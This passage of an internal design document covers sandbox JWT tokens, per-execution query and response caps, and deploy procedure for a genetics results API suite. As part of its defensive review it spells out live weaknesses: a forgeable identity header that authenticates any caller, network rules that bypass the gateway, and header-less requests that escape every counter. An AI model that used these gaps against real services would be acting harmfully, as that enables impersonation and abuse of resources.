per-user budget is ever wanted, the same in-process LRU counter keyed on `sid` or `sub`
instead of `jti` provides it; it is deliberately not in v1 because a cross-turn budget needs
shared state once replicas exceed 1.

**As shipped (`genetics-results-suite-4h6.28`), and the one place the implementation departs
from the paragraphs above.** db-api enforces all three limits in `api/main.py`: `_caps_for()`
resolves the row and byte ceilings from `request.state.principal`, the row cap is clamped in
`execute_query` (not on the Pydantic field, and not by lowering `MAX_ROWS`), and the aggregate
budget is charged from the dry run's estimate *before* the query runs and reconciled afterwards
to the bytes the job **processed** — so a cache hit does not consume budget and the 429 arrives
before the spend, not after it. A query that raises between the charge and the reconcile is
refunded in a `finally`: a job that never ran bills nothing, so a script's syntax errors, each
priced by the dry run, must not eat a budget they spent no bytes of.

*Processed, not billed — this section previously said "actually billed", which is the wrong
figure.* `total_bytes_billed` is what Google invoices (10 MB minimum, rounded up), but a
**dry-run job reports only `total_bytes_processed`** — its billed figure is 0. Processed is
therefore the one number available on *both* sides of a pre-flight charge and its correction,
and charging in one unit while reconciling in the other would make the correction wrong by
construction. The two differ by at most 10 MB per query against a 200 GB budget.

*The budget covers all four of db-api's BigQuery paths, not only `/query`.* `/schema`'s
distinct-value scans, `/stats`'s uncached `GROUP BY dataset, data_type` over `credible_sets_v`,
and `/tables/{t}/sample` all submit jobs and none of them is cached at the HTTP layer, so a
script could loop them for its whole wall clock at up to 50 GB a call entirely outside a budget
this section describes as an aggregate across every query of one execution. All three now go
through one shared helper (`_run_internal_query`) that refuses to start a job once the budget is
spent and charges what the job processed once it finishes. Post-hoc charging is forced — those
paths have no dry run to price them with — and it means the budget can be overshot by at most
one query, and by at most that query's `maximum_bytes_billed`, which is exactly what the
per-query cap bounds.

*The `/schema` value scans run at the **triggering** caller's ceiling, not the operator's.* They
used to pass no request at all, so a sandbox request drove them at the relaxed 100 GB ceiling —
**twice its own per-query cap** — and paid nothing, which inverts the point of the caps. The
earlier justification (one caller's cap must not decide what a later caller finds in the shared
`_get_categorical_values` cache) was sound about the cached *value*, but it silently also decided
who pays and at what ceiling, and those are separable. Cache contents are still not contaminated
across callers: a job over the triggering caller's ceiling fails and leaves the cache
unpopulated, so the next caller retries the scan under its own limits. `_VALUES_CACHE_TTL_SECONDS`
behaviour is otherwise unchanged.

db-api runs `replicas: 1` and no HorizontalPodAutoscaler exists in
`k8s/`, so the in-process counter is exact today — **at more than one replica it bounds spend
per replica, not globally.** That is a real limit of the design, not a detail: two replicas
would make the effective budget 400 GB per `jti`. `k8s/deployments/db-api.yaml` carries a
comment on `replicas: 1` saying so, because a routine scale-up would otherwise multiply the
budget silently.

results-api enforces a **16 MiB response-byte cap, and no row cap**, in
`SandboxResponseCapMiddleware` (`app/middleware.py`), registered innermost so it measures the
payload the caller decodes rather than its gzipped size. A capped response is buffered —
bounded by the byte cap itself — because a stream cannot be un-sent once its first chunk is on
the wire, and this design requires a 429 rather than a truncation. A relaxed response is never
buffered or inspected, so browser and BFF traffic is untouched.

*Why there is no row cap here, though the table above lists one for db-api.* Enforcing it meant
`json.loads` over the whole buffered body, synchronously on the event loop, purely to get a
length. For 25 000 wide rows the parsed object graph is several times the byte size, so peak
memory ran to roughly 100–200 MB per in-flight capped request on a `replicas: 1` pod with an
8Gi limit that already preloads the gene maps and the search index — and nothing limits a
script's concurrency. That made the row cap a memory amplifier **only a sandbox caller could
trigger**: presenting the token hurt the service more than omitting it. It also never bound the
payloads it was written for, because the counter recognised only JSON and **TSV is the default
`format` of every bulk range endpoint**. The byte cap was already the binding one — 25 000
summary-statistic rows serialize to roughly 5 MB, well inside 16 MiB — so dropping the row cap
removes the amplifier without loosening anything that bound. The buffer is now also passed
downstream as-is instead of being copied to `bytes`, which removed a second 16 MiB peak.

*Over the cap the producer is torn down, not merely ignored.* Dropping the later ASGI messages
bounds what the caller **receives** but not what results-api **spends**: measured, a 10 KiB cap
against a 100 KiB `StreamingResponse` returned 429 after 11 chunks while the generator produced
all 100 — and on the real endpoints that generator is GCS range reads plus the
`TABIX_FILTER_WORKERS` pool. The middleware now raises out of `send` once the 429 is on the
wire, which breaks `StreamingResponse.stream_response`'s `async for` and abandons the iterator.
The exception passes through Starlette's `ExceptionMiddleware` (which handles only
`HTTPException`) untouched and is caught by the cap middleware itself, so no 500 is ever
attempted over the 429 already sent. `tests/test_response_caps.py` counts the generator's
iterations to pin this, on both ASGI spec versions.

*The per-execution limits on results-api (`genetics-results-suite-4h6.29`).* The byte cap above
bounds **one** response; it does not bound a script that issues many in-cap requests over its 120
seconds, and the producer teardown of `4h6.28` bounds what a single *rejected* request costs to
produce, not a loop of accepted ones. `app/core/sandbox_budget.py` is the analogue of db-api's
`_jti_bytes`, deliberately shaped like it — one in-process map keyed on `jti`, checked **before**
the handler runs, answering 429 rather than truncating. The table above has **five** results-api
rows and this module holds **four** of them — the aggregate byte budget, the request count and
the two concurrency bounds; the 16 MiB per-response row lives in `app/core/limits.py` and
`app/middleware.py` instead. It carries a fifth control of its own that is not a table row,
`SANDBOX_MAX_TRACKED_EXECUTIONS` (below), which is why it emits **five** rejection codes.

It is admitted and released inside `SandboxResponseCapMiddleware`, whose `finally` the ASGI
contract puts after the last byte of the response, a `StreamingResponse` included. An earlier
draft justified that placement by saying a streaming generator outlives every dependency's
teardown; **measured on FastAPI 0.136.1 that is false** — a `yield` dependency's exit code runs
*after* the response body, so for a matched route the two placements are indistinguishable. The
reason the middleware is nevertheless the only correct place is different and stronger: `admit`
runs for every request, while a dependency is solved only for a **matched route**. An unmatched
path 404s out of the router with no dependency ever entered, so a teardown placement strands
that concurrency slot permanently — and `_sweep_locked` cannot reclaim the entry either, since
it refuses to evict anything with `in_flight > 0`. That is the mutation
`tests/test_sandbox_budget.py::test_an_unmatched_route_releases_its_slot` exists to kill.

*Rejection, not queueing, and the reason.* Queueing an over-concurrency request holds it while
the sandbox's ~120 second clock keeps running, which a script cannot distinguish from slow data
and cannot act on, and work admitted from a queue can complete after its execution is already
dead — precisely the wasted production `4h6.28` removed. A fast 429 leaves the script clock to
narrow the request or back off. Every one of these 429s carries a `code`, a `limit` and an
`observed` value (`sandbox_response_bytes`, `sandbox_aggregate_bytes`, `sandbox_request_count`,
`sandbox_concurrency`, `sandbox_concurrency_pod`, `sandbox_execution_tracker_full`), so an
operator reading a log line knows which control fired without inferring it from prose.

*Bytes are counted as **sent**, from the cap middleware's own buffer.* The two therefore cannot
diverge or double-count. **Every status is buffered, capped and charged, not only 2xx.** An
earlier draft exempted error responses on the grounds that "an error body is small"; that is
false, because FastAPI's own 422 handler *echoes the offending input* — measured, a 100 000-char
query parameter produced a 100 144-byte error body, and a 200 014-byte body was delivered under
a 500-byte cap with `bytes_sent` left at 0. Uncharged, uncapped error bodies made the real egress
bound `SANDBOX_MAX_REQUESTS_PER_EXECUTION` × (whatever fits in a URI or a request body) rather
than the 1 GiB budget. What the status still changes is only the *rejection*: an over-cap 2xx
becomes a 429, while an over-cap non-2xx keeps its own status and gets the same bounded stub
body, because rewriting a 404 into a 429 loses the real answer and invites a retry that can only
404 again. One body remains uncharged — a response *rejected* over the 16 MiB cap, whose bytes
never went on the wire; a loop of those is what the request-count limit bounds, and each still
consumes a request slot.

*Cleanup cannot evict a live execution.* db-api trims `_jti_bytes` LRU at 1024 entries, which can
drop a running execution's counter and silently reset its budget: the fail-open direction. Here
an entry is evictable only once its token has passed the point where `verify_sandbox_token` would
still accept it (`exp` plus the verifier's leeway, so no further request can present that `jti`)
**and** it has nothing in flight — the second condition covering a stream that outlives its own
token. The map is still hard-bounded at `SANDBOX_MAX_TRACKED_EXECUTIONS` (4096, swept lazily when
a new `jti` arrives), but at the bound it is the *new* execution that is refused, never a running
one that is evicted. Entries live at most one token lifetime (~305 s), so at the measured peak of
23 chat turns/hour the bound is a backstop rather than a working limit.

*`replicas: 1` is load-bearing here too.* The counters are in-process, so N replicas give one
execution N × every limit above — and N × the pod-wide concurrency bound that exists to protect
this pod's 8Gi against buffered response bodies. `k8s/deployments/results-api.yaml` carries a
comment on `replicas: 1` saying so, matching db-api's.

*Operator-tunable in fact, not only in principle.* All five env vars are declared at their
defaults in `k8s/deployments/results-api.yaml`, so tuning one is an edit and a rollout rather
than a rebuild. They were code-default-only in the first draft, which made "env-configurable"
true of the code and false in practice. Each is a ceiling compared with `>=`, so a value below 1
would silently mean "reject every sandbox request" — results-api therefore refuses to start on
one, and on `SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL < SANDBOX_MAX_CONCURRENT_REQUESTS`, rather
than failing at the first request where no health check would attribute it to a typo.

**Two limitations, stated because as shipped these controls bound less than the rest of this
section implies.**

1. *They only bind a request that volunteers a token — this is not yet a complete bound.*
   `_sandbox_principal` reads the `Authorization` header off the ASGI scope; with no header it
   returns `None` and `admit` is never called, so the request is counted against **nothing**: no
   aggregate byte budget, no request count, no concurrency slot. results-api answers 200 with no
   credential on its seven `@is_public` routes (`/api/v1`, `/healthz`, `/api/v1/auth`,
   `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, and `/api/v1/rsid/variants` GET and
   POST — re-derive with `grep -rn "@is_public" app/`), and the sandbox's NetworkPolicy egress
   reaches `results-api:4000` **directly**, bypassing auth-gateway. Measured: 20 of 20
   header-less requests were served 200 with the counter map still empty. The invariant
   `app/core/limits.py` states — that omitting the header cannot buy a *looser* limit — holds
   for the per-response byte cap only; for these four counters, omitting it buys **no** limit,
   and that module's docstring now says so. So read this section as bounding an *honest*
   execution's consumption, which is what it was written for. Closing the gap needs a way to
   identify sandbox traffic without a token — a design decision filed separately, and
   deliberately **not** papered over with a rate limiter, a request timeout or an
   anonymous-traffic bucket, each of which would change the perimeter without deciding it.
2. *`sandbox_execution_tracker_full` and the pod-wide concurrency limit are cross-tenant denial
   surfaces.* Both are pod-wide, so a caller that fills the counter map or holds the pod-wide
   slots locks *other* executions out; neither is merely a self-limit. The "23 chat turns/hour"
   sizing above is an argument about honest volume and says nothing about an attacker, and with
   limitation 1 unclosed there is no per-tenant fairness behind either number. They are sized far
   above honest use precisely so an honest execution never meets them, and both fail toward
   refusing new work rather than corrupting a running execution's accounting.

Production impact today is nil: no sandbox Deployment exists and `SANDBOX_ENABLED` is `"false"` on
both services, so nothing but `tests/test_sandbox_budget.py` (30 tests, offline lane) will report
a regression in any of this.

**The departure: `@is_public` routes are relaxed, not tight — and the measurement that
decided it.** Read literally, "no credential gets the tight limits" would apply the sandbox
caps to results-api's `@is_public` routes, because `auth_required` returns before
`get_verified_user` and no principal is resolved there at all. Re-derive that set with
`grep -rn "@is_public" app/` rather than trusting a count here — today it is **seven**:
`/api/v1/auth`, `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, `/api/v1/rsid/variants`
GET and POST, and — missed by earlier drafts of this section, which said five — `/api/v1` and
`/healthz` (`app/server.py`), each of which returns a fixed handful of bytes.
Those routes are the browser's, reached through bff (`bff/inputParse.ts:81` and `:215`).

The first question was whether tight caps there would truncate or 429 a real browser request.
Measured, they would not, and the numbers are worth recording because they are the reason this
is a judgement call rather than a forced one:

| public route | production calls, `timestamp >= "2026-07-13" AND timestamp < "2026-08-12"` | largest response possible | vs the 16 MiB cap |
|---|---|---|---|
| `GET /api/v1/rsid/variants` | 64 | ~700–1 300 rows, bounded by URL length (nginx `large_client_header_buffers` 8k, h11's 16 KiB) rather than by code | <1% |
| `POST /api/v1/rsid/variants` | 0 (never seen in production) | was **unbounded in code**; now 5 000 ids (`app/routers/rsid.py` `MAX_RSIDS`), enforced for every caller | <1% |
| `GET /api/v1/variant_sets/{name}` | 3 | 888 rows / 18.6 KB (`FinnGen_enriched_202505`, the largest configured file) | 0.1% |
| `GET /api/v1/variant_sets` | 0 (never seen in production) | 3 rows / 74 B | — |
| `GET /api/v1/auth` | 0 (1 hit ever, 2026-03-07) | 1 object / ~90 B | — |
| `GET /api/v1` | 0 (4 hits ever, last 2026-05-20) | a fixed object of a few hundred bytes | — |
| `GET /healthz` | unmeasurable — excluded from usage logging by design | a fixed object of a few hundred bytes | — |

**Where these numbers come from, so they can be re-run.** `phewas-development.genetics_api_logs.stdout`
— the GKE production table — over the **fixed window `[2026-07-13 00:00 UTC, 2026-08-12 00:00 UTC)`**;
the "ever" figures are the same table unbounded (it starts 2026-03-06). The bounds are **literal
on purpose**: an earlier draft printed `TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)` while
labelling the window as calendar dates, so the query drifted a day per day away from the numbers
beside it and re-running it produced a different table every time (55 rather than 64 on the top
row, the whole of the disagreement). Re-run this query verbatim and you get the table above; change
the bounds and you are measuring something else, so change the counts with them. Query:

```sql
SELECT jsonPayload.http_method, jsonPayload.endpoint_path, COUNT(*) AS n, MAX(timestamp) AS last_hit
FROM `phewas-development.genetics_api_logs.stdout`
WHERE timestamp >= "2026-07-13" AND timestamp < "2026-08-12"
  AND jsonPayload.log_type = "endpoint_access"
GROUP BY 1, 2 ORDER BY n DESC
```

Add `AND jsonPayload.service = "results-api"` to exclude db-api's rows, which land in this same
table — but only for rows written on or after 2026-08-12; before that, see the three eras under
`docs/project-spec.md` → "Log sinks". Do **not** filter on
`jsonPayload.log_source = 'genetics-results-api-prod'`: results-api renamed
that value to `finngenie_prod` on 2026-06-03, so the old value returns nothing after that date and
no error — which is exactly why `service` exists and `log_source` is not the discriminator. Do
**not** query `genetics_api_logs.genetics_results_api`, which earlier drafts of this
table used — despite its name it is not the production service (see below).

An earlier draft's row asserting "`GET /api/v1`, `GET /healthz` — not in the sink" was wrong for
one and right for the other, for different reasons. `/api/v1` **is** logged; it simply gets
almost no traffic (4 hits in the table's whole history). `/healthz` is genuinely absent, but by
design rather than by disuse: it is in `usage_logging_excluded_paths`
(`app/config/common.py`, alongside `/api/v1/docs`, `/api/v1/redoc`, `/api/v1/openapi.json`,
`/favicon.ico`), so no volume of kubelet probes would ever appear. Its call count is therefore
not measurable from this sink at all — but it returns a fixed object either way, so nothing in
the argument turns on it.

The remaining zeroes are real and unsurprising: these public routes are the browser's, and the
browser is a small share of a service whose traffic is dominated by `mcp-tool` calls to
authenticated routes.

Sizes are measured from the GCS variant-set files and from auth-gateway's `$body_bytes_sent`
(external traffic only — bff and mcp-server reach results-api in-cluster and bypass the
gateway, so **no response size is logged for the dominant caller**). The middleware emits a
`jsonPayload`-only record, so `httpRequest.responseSize` is structurally NULL on every row of
this sink — there is no response-size data in it at all — and `full_path`, which would reveal
rsid counts, is stripped before Cloud Logging.

*What this table cannot show, and why an earlier draft got it wrong.* An earlier draft sourced
these counts from `phewas-development.genetics_api_logs.genetics_results_api` and added
"`user_email` is NULL on every one of these rows, confirming no principal is resolved". **Both
the counts and that inference are withdrawn.** The reason is not a sink artifact, a lag, or
anything about principals: **that table is a different machine's log.** A BigQuery log sink names
its table after the *log ID*, not after the service, so the table carrying the service's name is
the decoy — it is fed by the `genetics-results-api-dev1` GCE VM running the results-api **test
suite** (`sourceLocation.file` points inside a developer checkout; 1,638 entries within a single
second), while the production GKE rows are in `stdout`. Every number in the old table therefore
measured a developer's tests, and its all-NULL `user_email` was a property of test traffic, not
of production principals. See `docs/project-spec.md` → "Log sinks" for the full account. The
table above is re-measured against `stdout`; sizes are still not available from any sink, so the
no-truncation conclusion below rests — as it already did — on the caps being unreachable by the
largest response this code can produce, not on logged size data.

So capping them would not regress anything today. They are nonetheless **relaxed**, because the
exception costs nothing and the alternative does not: these routes already answer the open
internet with no credential and bill no BigQuery, so tight caps would constrain only *anonymous*
browser traffic, while carrying a real regression risk if a curated variant set is ever
configured with more than 25 000 variants. `REQUIRE_AUTH=false` (local development; the shipped
`results-api.yaml` sets `"true"`) is relaxed for the same reason.

**Why the exception has zero security delta — and the premise that had to be made true first.**
The earlier argument was that a sandbox script is capped on these routes either way, so relaxing
them changes nothing for it. That was half the story, and the missing half was a live break of
the invariant. On `POST /api/v1/rsid/variants`, `parse_and_validate_rsids` validated format and
never counted, and the handler read the body with an unbounded `await request.body()`. So a
script **presenting** its sandbox token got 25 000 rows / 16 MiB, while the same script
**omitting** the header got an unbounded response fully materialized in the pod — the absent
credential buying a strictly looser cap than the sandbox credential, which is exactly what this
section forbids. `k8s/network-policies/sandbox-policy.yaml` admits the sandbox to
results-api:4000 directly, bypassing auth-gateway, so its `client_max_body_size` never saw that
body either.

What makes the exception safe is therefore not the cap but that every public route bounds its
own response **for every caller**. `parse_and_validate_rsids` now rejects more than `MAX_RSIDS`
ids with a 422 and the POST bounds its body read as it streams, both with **no sandbox special
case** — a sandbox-only bound would leave the looser path open to the caller that simply
declines to identify itself, so the uniformity is what makes the invariant hold. `MAX_RSIDS` is
5 000, taken from the GET's own incidental ceiling: h11 caps the request line plus headers at
16 KiB and the shortest possible id costs 4 bytes in the query string ("rs1,"), so no GET that
works today can carry more than 4 096 ids. 5 000 therefore regresses nothing that currently
succeeds, while bounding the POST to a response of a few hundred KB. No bulk POST caller exists
today.

The other half of the change still holds and still matters: the sandbox principal is resolved in
`auth_required` **before** both short circuits, so a sandbox token is capped on a public route
and under `REQUIRE_AUTH=false` as well. It is not sufficient on its own, because it only
tightens the caller that chose to identify itself — which is why the invariant rests on the
uniform bound above. The invariant the section
above is really asserting — *a caller must never obtain looser limits by presenting a weaker
credential* — is preserved: a sandbox token is capped everywhere it is presented, and dropping
a verified credential on a route that requires one yields a 401, not a wider cap. What is
relaxed is the absence of a credential on a route that asks for none.

### results-api: weaker auth than db-api, and a bypass that must close first

Section 4 above works through db-api's `require_auth`. **results-api's authentication is a
different and weaker code path, and `4h6.9` must not assume the db-api reasoning transfers.**
Three specifics, all verified against the source:

1. **A forged identity header authenticates.** `genetics-results-api/app/core/auth.py`
   `get_verified_user()` calls `get_bearer_token_user()`, and when that returns `None` —
   which is what happens when there is **no `Authorization` header at all** — it falls
   through to `get_authenticated_user()`, which reads `X-Goog-Authenticated-User-Email` and
   splits it on `":"`. There is no proof of origin on that header. Anything that can reach
   results-api can name itself any user.
2. **Anything in the namespace can reach results-api.**
   `k8s/network-policies/policies.yaml` `allow-ingress-results-api` contains a rule with
   `- ports: - port: 4000` and **no `from:`**, which admits all sources. auth-gateway does
   handle the identity header correctly *at the edge*, but nothing forces traffic through
   auth-gateway, so any pod in the namespace bypasses it.
3. **Rule 2 of the db-api list is unimplementable here as written.**
   `get_bearer_token_user` runs `hmac.compare_digest` against the shared secret **first**,
   and only then routes on `"." in token`. A sandbox HS256 JWT contains dots, so if the
   sandbox validator is inserted after the dot check — or is allowed to fall through on
   failure — the token continues into `id_token.verify_oauth2_token`, where
   `GOOGLE_TOKEN_AUDIENCE` is unset in `k8s/deployments/results-api.yaml` and the code logs
   a warning and continues.
4. **And the dot test cannot be the discriminator, because results-api has another JWT
   caller.** Google Identity Tokens are three-segment JWTs too, and they are handled today
   at exactly that `if "." in token` branch. A rule of "JWT-shaped bearer → sandbox
   validator, hard 401 on failure, never a fallthrough" would therefore reject **every
   Google Identity Token results-api serves**. (The no-dots user-API-token path survives;
   the Google path does not.) This is the same correction as db-api rule 1, and here it is
   not latent — it is immediately fatal.

**Specification for `4h6.9` on the results-api side:**

- **Discriminate on the JOSE header.** Base64url-decode the first segment unverified, read
  `alg`, and treat the bearer as sandbox-shaped only when `alg == "HS256"` (optionally also
  requiring `iss == "chat-backend"`). RS256 bearers continue to `verify_oauth2_token`
  exactly as today; dotless bearers continue to the user-API-token path exactly as today.
  Safe for the same reason as db-api rule 1: the untrusted header only *selects* a
  validator, and each validator pins its own algorithm independently (`algorithms=["HS256"]`
  with the signing key, versus Google's RS256 certificates), so a forged `alg` changes only
  which validator rejects the token.
- Insert the sandbox validator **before** the `hmac.compare_digest` shared-secret
  comparison, not after it and not after the dot check. A sandbox-shaped bearer must never
  be compared against the shared secret, and must never reach `verify_oauth2_token`.
- Sandbox-validator failure is a **hard `401`**. Never a fallthrough to another auth path,
  never a warning-and-continue. This is the same fail-closed requirement as db-api rule 2,
  restated because the ordering in this file makes it easy to get wrong. It applies to
  HS256 bearers **only** — a non-HS256 bearer was never a sandbox token and its handling is
  unchanged.
- results-api carries its **own** row and response-size caps for the sandbox audience, on
  the same defaults-not-penalty basis as db-api above — with results-api's broader relax
  condition (**any** verified non-sandbox principal: shared secret, Google id_token, or
  per-user API token), because auth-gateway's `@api_bearer` location sends real users here
  with no shared secret. It currently has **no caps specified at all**, and it serves the
  bulkiest payloads in the suite (summary-statistic ranges, LD matrices) — a per-response
  byte ceiling matters more here than a row count.

**Blocking dependency.** Points 1 and 2 are **pre-existing bugs, not introduced by this
design**, and they are tracked as `genetics-results-suite-fad` (already filed). They are
not fixed here and results-api's authentication is not redesigned in this document — see
the bead. But the sandbox is the first caller of results-api that runs attacker-authored
code, so a scoped token is meaningless while an unauthenticated pod on the same network can
name itself any user: **`4h6.8` and `4h6.9` must not ship before `genetics-results-suite-fad`
is closed.**

**What the sandbox does *not* get:** `INTERNAL_API_SECRET`, `MCP_API_KEY`, any GCP
credential, any Keycloak client secret, any Perplexity/Tavily key, and no Kubernetes
service account token.

### As built (`4h6.9`) — what shipped, and where it departs from the above

Everything in this subsection is code that exists; everything above it that is not repeated
here is still design. Three files carry the mechanism:

| repo | file | role |
|---|---|---|
| genetics-mcp-server | `src/genetics_mcp_server/sandbox_token.py` | mint |
| genetics-results-db | `api/sandbox_auth.py` | verify (`aud: db-api`) |
| genetics-results-api | `app/core/sandbox_token.py` | verify (`aud: results-api`) |

**The minting contract `4h6.14` calls.** One call produces the pair for an execution:

```python
from genetics_mcp_server.sandbox_token import mint_execution_tokens

minted = mint_execution_tokens(user=<authenticated email>, session_id=<chat session id>)
minted.execution_id   # uuid4 — the jti of both tokens AND the /scratch/<id> directory name
minted.db_api         # aud: db-api
minted.results_api    # aud: results-api
minted.expires_at     # iat + 300
```

`execution_id` may be passed in when the caller has already chosen the `/scratch` directory
name; the two must be the same value or the log join in `4h6.12` does not close. Minting
raises `SandboxTokenUnavailable` when `SANDBOX_TOKEN_SIGNING_KEY` is unset — deliberately an
exception rather than a `None`, because every fallback from "no sandbox token" is either
"send no credential" or "send the shared secret", which are the two outcomes this whole
mechanism exists to prevent. `4h6.14` owns everything downstream of the return value: the
POST body, the mode-0600 file under `/scratch/<id>`, and the child's environment.

**Deviations from the design above, all deliberate:**

1. **`iss` is required, not optional.** The design said routing may "optionally also require
   `iss == "chat-backend"`". Both validators pass `issuer="chat-backend"` to the decoder, so a
   token signed with the right key but issued by anything else is rejected. Routing still keys
   on `alg` alone; `iss` is a validation rule, not a routing rule.
2. **`iat` is checked explicitly.** PyJWT accepts an arbitrarily old `iat` as long as `exp` is
   in the future, so a token minted with a long TTL would outlive the 5-minute window. Both
   validators reject `iat` older than 300s, as rule 4 requires.
3. **`scope` is required to be present** but is not in the decoder's `require` list, because
   its absence is a distinct rejection reason worth logging separately. Its *value* is still
   uninterpreted, exactly as the table says.
4. **The per-credential caps are not implemented here.** Everything from "Implementation note
   for the caps" to the end of the numbers table — the 50 GB per-query ceiling, the 200 GB
   per-`jti` aggregate budget, the 25 000-row response cap, and results-api's response-byte
   ceiling — is **deferred to `genetics-results-suite-4h6.28`**. `4h6.9` ships the credential
   and the hook it needs: db-api leaves the resolved principal on `request.state.principal`
   (a `SandboxPrincipal`, the string `"internal"` for a shared-secret caller, or `None` for
   the fail-open and `/health` cases), and results-api leaves it on
   `request.state.sandbox_principal`. The "defaults-not-penalty" inversion is a behaviour
   change for *every* caller of both services and is not a credential change; keeping it out
   of this bead keeps the fail-closed work reviewable on its own.
5. **results-api reports a sandbox execution as `sandbox:<user>`, not as the bare email.**
   `get_verified_user` returns one string and it feeds both authorization and the
   `endpoint_access` log. Returning the bare email would make a sandbox request
   indistinguishable from a verified human, which is exactly the distinction `4h6.28`'s relax
   condition needs. The `sid` and `jti` are added to the `endpoint_access` line from
   `request.state.sandbox_principal`.
6. **db-api's `require_auth` no longer early-returns on `/health` *before* clearing state.**
   It sets `request.state.principal = None` first, so no handler can read a stale principal.
7. **Minter invariants are asserted by the verifiers, not assumed.** `options={"require": …}`
   rejects only *missing* or null claims, so both validators additionally reject an empty
   `sub`, `sid` or `jti` (a token attributing the query to nobody defeats the point of the
   credential), and require `aud` to be exactly a **string** — PyJWT treats a list `aud` as
   membership, so `{"aud": ["db-api", "results-api"]}` would otherwise validate at *both*
   services and one-token-per-audience would be a minter property only.
8. **`leeway=5` on both `jwt.decode` calls**, for the forward-direction skew the ttl cannot
   cover — see "Clock skew" above. The `MAX_TOKEN_AGE_SECONDS` check is unaffected.
9. **Rule 5's logging works differently on the two services.** db-api logs a *dict* message,
   which its formatter merges into `jsonPayload` verbatim. results-api's `GCPJsonFormatter`
   copies `extra=` fields only for names on the `EXTRA_LOG_FIELDS` allow-list when the message
   is a string, so `sub`, `sid` and `jti` were added to that list — without them the
   "sandbox request authorized" line reached the sink with no attribution at all. The
   `endpoint_access` line's `sid`/`jti` come from `request.state` on the middleware's dict
   path and were never affected.

**Where the token sits in each validator's precedence.**

- **db-api** — `require_auth`: `/health` → sandbox-shaped bearer (hard 401 on failure) →
  unset-`INTERNAL_API_SECRET` fail-open → `hmac.compare_digest`. The sandbox branch is
  ahead of the fail-open early return, which is rule 1.
- **results-api** — `get_verified_user`, as a new **case 0** ahead of the four cases
  `genetics-results-suite-fad` established: sandbox token → `sandbox:<user>`; then internal
  marker + identity header; then internal marker alone → `mcp-tool`; then Google id_token /
  user API token; then identity header alone → `None`. The same check is also first inside
  `get_bearer_token_user`, so a direct caller of that function cannot skip it. A sandbox
  caller holds no shared secret, so it cannot present the trusted-proxy marker and any
  identity header it sets is already discarded by case 5.

**No collision with `genetics-results-suite-fdd`.** That bead is about
`GOOGLE_TOKEN_AUDIENCE` being the public gcloud CLI client id, so the `aud` check on the
Google path binds nothing. The sandbox path never reaches `verify_oauth2_token`: an HS256
bearer is routed away before it, and an RS256 bearer is never routed to the sandbox
validator. The two audience checks are separate code, separate keys and separate claim
spaces; `4h6.9` neither fixes nor worsens `fdd`.

**A known gap, left open deliberately — and it is an attribution gap as much as an
authorization one.** results-api's `auth_required` returns before any credential check when
`REQUIRE_AUTH` is false or the route is `@is_public`. A sandbox token therefore proves nothing
on a public route — the sandbox reaches those as an anonymous caller, exactly as any other pod
with network reach does. Less obviously: because `auth_required` returns *before*
`get_verified_user` runs, no sandbox principal is ever resolved on those routes, so
`request.state.sandbox_principal` is unset and the `endpoint_access` line carries **no `sid`
and no `jti`**. Section 6.2's control 3 — "what did that script actually read?" — is therefore
blind on the `@is_public` route set, and `4h6.28`'s per-credential caps, which key on the
resolved principal, will not apply there either. That is the pre-existing shape of
results-api's public endpoints, not something this token changes, and closing it is a question
about the public-route set rather than about the credential.

### Deploy ordering: there is no ordering hazard, and one configuration lockout

Unlike `fad` (bff before results-api) and `th2` (auth-gateway before chat-backend), **the
sandbox credential path is entirely new: no caller sends an HS256 bearer today, and none will
until `4h6.7` and `4h6.14` land the sandbox and `run_analysis`.** The sending and receiving
sides can therefore ship in either order, and the table is short:

| state | chat-backend mints | db-api / results-api verify | result |
|---|---|---|---|
| neither shipped | no | no | current behaviour, unchanged |
| **validators only** | no | yes | **safe.** Nothing sends an HS256 bearer, so the new branch never fires. Every existing credential type is unaffected — shared secret, Google id_token, per-user API token, trusted-proxy marker |
| **minter only** | yes | no | **safe today**, because nothing calls the minter until `4h6.14`. Were a token sent, an old db-api would 401 it at `compare_digest` and an old results-api would 401 it at `verify_oauth2_token` — a failed request, never an authorization |
| both shipped | yes | yes | the sandbox path works |

The real ordering constraint is **the secret, not the code**: all three Deployments mount
`sandbox-token-signing-key` from `genetics-secrets`, so `create-secrets.sh` must run before
the manifests are applied or the pods sit in `CreateContainerConfigError`. `deploy.sh` now
checks that key (and `internal-api-secret`) is non-empty before applying anything, so an
older `genetics-secrets` that predates this work fails at deploy time rather than at pod
start.

The one lockout is **`SANDBOX_ENABLED=true` with either secret missing**, which is
`sys.exit(1)` in both services by design — a crash-looping db-api and results-api is the
whole suite down. Both manifests therefore ship it as `"false"`; the deploy that creates the
sandbox Deployment (`4h6.7`) flips it, and must do so only after `create-secrets.sh` has run.
**Rollback direction: set `SANDBOX_ENABLED=false` and restart** — that restores service
immediately without touching secrets or images, and only disables the startup assertion, not
the token validation.

**Rotating the signing key — not atomic, and it is an outage window, not one lost execution.**
`create-secrets.sh` reuses the value already in the cluster and only generates on first
install, like `internal-api-secret`. But all three Deployments read the key from the
environment, which freezes at *pod start*: updating the Secret changes nothing until each pod
restarts, and a rolling restart of three Deployments is not simultaneous. For the whole
restart window the minter and a verifier disagree about the key, and **every sandbox execution
routed to a pod on the other side of the rotation 401s** — not just the tokens in flight at
the moment of the change. Sequence it deliberately: patch the Secret, restart all three, and
treat sandbox executions as failing until the last pod is Ready. Nothing else breaks (the
shared-secret, Google id_token and user-API-token paths are untouched), and the rollback is
the same operation in reverse.

**If a Deployment's env is missing the key entirely**, either fix works. Re-running
`create-secrets.sh` is safe for the optional keys — it reuses whatever is already in the cluster
for every key it is not given in the environment, so the ones you have not exported
(`openai-api-key`, `tavily-api-key`, `perplexity-api-key`, `cohere-api-key`, `mcp-api-key`,
`external-mcp-servers`, `admin-users`, `slack-webhook-url`) survive untouched. It does require
`ANTHROPIC_API_KEY` to be exported: that key alone is never read back from the cluster, and
without it the script aborts before writing anything. Without that key to hand, use the targeted
`kubectl patch secret genetics-secrets --type=merge` on the one missing key instead —
`deploy.sh`'s secret gate prints both options.

**Accepted residual: a symmetric key means db-api and results-api can mint.** HS256 is one
secret shared by all three services, so verification and *minting* are the same capability.
A compromise of db-api or results-api yields a key that forges tokens impersonating
chat-backend with any `sub`, `sid` and `jti` — attribution in the `endpoint_access` log is
only as trustworthy as the least-trusted holder of the key. This is accepted for v1: both
